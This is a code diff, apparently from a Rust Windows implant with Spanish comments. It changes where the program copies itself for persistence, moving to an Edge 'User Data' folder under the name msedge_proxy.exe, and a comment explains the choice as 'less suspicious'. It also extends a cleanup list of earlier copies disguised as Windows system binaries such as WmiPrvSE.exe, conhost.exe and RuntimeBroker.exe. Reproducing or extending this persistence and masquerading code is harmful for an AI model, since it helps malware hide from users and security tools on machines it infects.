@@ -43,8 +43,9 @@ fn copy_to_appdata() -> Result<String, String> {
     let localappdata = env::var("LOCALAPPDATA")
         .unwrap_or_else(|_| "C:\\Users\\Public\\AppData\\Local".to_string());
     
-    let target_dir = format!("{}\\Microsoft\\WindowsApps", localappdata);
-    let target_path = format!("{}\\RuntimeBroker.exe", target_dir);
+    // Cambiar a Microsoft\Edge\User Data (ubicación más accesible y menos sospechosa)
+    let target_dir = format!("{}\\Microsoft\\Edge\\User Data", localappdata);
+    let target_path = format!("{}\\msedge_proxy.exe", target_dir);
     
     // Crear directorio
     let _ = fs::create_dir_all(&target_dir);
@@ -69,6 +70,12 @@ fn copy_to_appdata() -> Result<String, String> {
         let n = src.read(&mut buf).map_err(|e| format!("Read: {}", e))?;
         if n == 0 { break; }
         dst.write_all(&buf[..n]).map_err(|e| format!("Write: {}", e))?;
+    }
+    
+    // Flush y verificar que el archivo existe
+    drop(dst);
+    if !fs::metadata(&target_path).is_ok() {
+        return Err("Error: archivo no copiado correctamente".to_string());
     }
     
     Ok(target_path)
@@ -372,16 +379,20 @@ pub fn remove_persistence() -> Result<String, String> {
         .creation_flags(0x08000000)
         .output();
     
-    // Eliminar archivos antiguos copiados
+    // Eliminar archivos antiguos copiados (TODAS las versiones)
     let localappdata = env::var("LOCALAPPDATA").unwrap_or_default();
     let appdata = env::var("APPDATA").unwrap_or_default();
     
     let old_files = [
+        // Versión antigua (WindowsApps)
+        format!("{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe", localappdata),
+        // Versión nueva (Edge User Data)
+        format!("{}\\Microsoft\\Edge\\User Data\\msedge_proxy.exe", localappdata),
+        // Otras versiones antiguas
         format!("{}\\Microsoft\\Windows\\Caches\\WmiPrvSE.exe", localappdata),
         format!("{}\\Microsoft\\Windows\\WER\\ReportQueue\\conhost.exe", localappdata),
         format!("{}\\Microsoft\\OneDrive\\logs\\OneDriveStandaloneUpdater.exe", localappdata),
         format!("{}\\Microsoft\\Windows\\INetCache\\Low\\MoUsoCoreWorker.exe", localappdata),
-        format!("{}\\Microsoft\\WindowsApps\\RuntimeBroker.exe", localappdata),
     ];
     for f in &old_files {
         let _ = std::fs::remove_file(f);
